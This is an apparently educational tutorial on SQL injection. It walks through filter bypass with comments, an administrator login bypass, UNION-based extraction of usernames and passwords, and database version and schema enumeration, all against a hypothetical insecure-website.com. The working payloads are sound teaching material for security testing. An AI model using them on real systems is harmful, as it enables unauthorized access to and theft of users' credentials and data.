SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. 

This can allow an attacker to view data that they are not normally able to retrieve. 

This might include data that belongs to other users, or any other data that the application can access. 

In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behaviour.

In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure. It can also enable them to perform denial-of-service attacks


 To do this, you would typically submit:

- The single quote character `'` and look for errors or other anomalies.
- Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
- Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the application's responses.
- Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
- OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.

Alternatively, you can find the majority of SQL injection vulnerabilities quickly and reliably using Burp Scanner

Imagine a shopping application that displays products in different categories. When the user clicks on the **Gifts** category, their browser requests the URL:

`https://insecure-website.com/products?category=Gifts`


```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

This SQL query asks the database to return:

- all details (`*`)
- from the `products` table
- where the `category` is `Gifts`
- and `released` is `1`.

The restriction `released = 1` is being used to hide products that are not released. We could assume for unreleased products, `released = 0`


The application doesn't implement any defences against SQL injection attacks. This means an attacker can construct the following attack, for example:

`https://insecure-website.com/products?category=Gifts'--`

This results in the SQL query:

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

Crucially, note that `--` is a comment indicator in SQL. This means that the rest of the query is interpreted as a comment, effectively removing it. In this example, this means the query no longer includes `AND released = 1`. As a result, all products are displayed, including those that are not yet released.

You can use a similar attack to cause the application to display all the products in any category, including categories that they don't know about:

`https://insecure-website.com/products?category=Gifts'+OR+1=1--`

This results in the SQL query:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

The modified query returns all items where either the `category` is `Gifts`, or `1` is equal to `1`. As `1=1` is always true, the query returns all items.

#### Warning

Take care when injecting the condition `OR 1=1` into a SQL query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an `UPDATE` or `DELETE` statement, for example, it can result in an accidental loss of data.


 # Subverting application logic
 
Imagine an application that lets users log in with a username and password. If a user submits the username `wiener` and the password `bluecheese`, the application checks the credentials by performing the following SQL query:

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.

In this case, an attacker can log in as any user without the need for a password. They can do this using the SQL comment sequence `--` to remove the password check from the `WHERE` clause of the query. For example, submitting the username `administrator'--` and a blank password results in the following query:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

This query returns the user whose `username` is `administrator` and successfully logs the attacker in as that user


## SQL injection in different parts of the query

Most SQL injection vulnerabilities occur within the `WHERE` clause of a `SELECT` query. Most experienced testers are familiar with this type of SQL injection.

However, SQL injection vulnerabilities can occur at any location within the query, and within different query types. Some other common locations where SQL injection arises are:

- In `UPDATE` statements, within the updated values or the `WHERE` clause.
- In `INSERT` statements, within the inserted values.
- In `SELECT` statements, within the table or column name.
- In `SELECT` statements, within the `ORDER BY` clause.

## SQL injection UNION attacks

When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the `UNION` keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.

The `UNION` keyword enables you to execute one or more additional `SELECT` queries and append the results to the original query. For example:

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```


This SQL query returns a single result set with two columns, containing values from columns `a` and `b` in `table1` and columns `c` and `d` in `table2`

For a `UNION` query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:

- How many columns are being returned from the original query.
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

## Determining the number of columns required

When you perform a SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.

One method involves injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs. For example, if the injection point is a quoted string within the `WHERE` clause of the original query, you would submit:

```sql
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3-- 
```


This series of payloads modifies the original query to order the results by different columns in the result set. The column in an `ORDER BY` clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:

`The ORDER BY position number 3 is out of range of the number of items in the select list.`


The application might actually return the database error in its HTTP response, but it may also issue a generic error response. In other cases, it may simply return no results at all. 

Either way, as long as you can detect some difference in the response, you can infer how many columns are being returned from the query.

The second method involves submitting a series of `UNION SELECT` payloads specifying a different number of null values:

```sql
' UNION SELECT NULL-- 
' UNION SELECT NULL,NULL-- 
' UNION SELECT NULL,NULL,NULL-- 
```
etc.`

If the number of nulls does not match the number of columns, the database returns an error, such as:

`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`

We use `NULL` as the values returned from the injected `SELECT` query because the data types in each column must be compatible between the original and the injected queries. 

`NULL` is convertible to every common data type, so it maximises the chance that the payload will succeed when the column count is correct.

As with the `ORDER BY` technique, the application might actually return the database error in its HTTP response, but may return a generic error or simply return no results. 

When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. 

The effect on the HTTP response depends on the application's code. If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table.

Otherwise, the null values might trigger a different error, such as a `NullPointerException`. In the worst case, the response might look the same as a response caused by an incorrect number of nulls. This would make this method ineffective.


## Database-specific syntax

On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `dual` which can be used for this purpose. So the injected queries on Oracle would need to look like:

`' UNION SELECT NULL FROM DUAL--`

The payloads described use the double-dash comment sequence `--` to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character `#` can be used to identify a comment.


## Finding columns with a useful data type

A SQL injection UNION attack enables you to retrieve the results from an injected query. The interesting data that you want to retrieve is normally in string form. This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.

After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of `UNION SELECT` payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:

```sql
' UNION SELECT 'a',NULL,NULL,NULL-- 
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--
```

If the column data type is not compatible with string data, the injected query will cause a database error, such as:

`Conversion failed when converting the varchar value 'a' to data type int.`

If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.


## Using a SQL injection UNION attack to retrieve interesting data

When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.

Suppose that:

- The original query returns two columns, both of which can hold string data.
- The injection point is a quoted string within the `WHERE` clause.
- The database contains a table called `users` with the columns `username` and `password`.

In this example, you can retrieve the contents of the `users` table by submitting the input:

```SQL
' UNION SELECT username, password FROM users--

```

In order to perform this attack, you need to know that there is a table called `users` with two columns called `username` and `password`. 

Without this information, you would have to guess the names of the tables and columns. All modern databases provide ways to examine the database structure, and determine what tables and columns they contain.

## Retrieving multiple values within a single column

In some cases the query in the previous example may only return a single column.

You can retrieve multiple values together within this single column by concatenating the values together. 

You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:
```sql
' UNION SELECT username || '~' || password FROM users--
```

This uses the double-pipe sequence `||` which is a string concatenation operator on Oracle. The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character.

The results from the query contain all the usernames and passwords, for example:

```sql
administrator~s3cure 
wiener~peter 
carlos~montoya 
```

## Examining the database in SQL injection attacks

To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:

- The type and version of the database software.
- The tables and columns that the database contains

## Querying the database type and version

You can potentially identify both the database type and version by injecting provider-specific queries to see if one works

The following are some queries to determine the database version for some popular database types:

|   |   |
|---|---|
|Database type|Query|
|Microsoft, MySQL|`SELECT @@version`|
|Oracle|`SELECT * FROM v$version`|
|PostgreSQL|`SELECT version()`|

For example, you could use a `UNION` attack with the following input:
```sql
' UNION SELECT @@version--
```


This might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:

```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64) Mar 18 2018 09:11:49 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows Server 2016 Standard

```

## Listing the contents of the database

Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

For example, you can query `information_schema.tables` to list the tables in the database:

```
SELECT * FROM information_schema.tables
```

This returns output like the following:

```sql
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE ===================================================== MyDatabase dbo Products BASE TABLE MyDatabase dbo Users BASE TABLE MyDatabase dbo Feedback BASE TABLE

```
This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.

You can then query `information_schema.columns` to list the columns in individual tables:

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

This returns output like the following:

```sql
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE ================================================================= MyDatabase dbo Users UserId int MyDatabase dbo Users Username varchar MyDatabase dbo Users Password varchar
```

This output shows the columns in the specified table and the data type of each column.
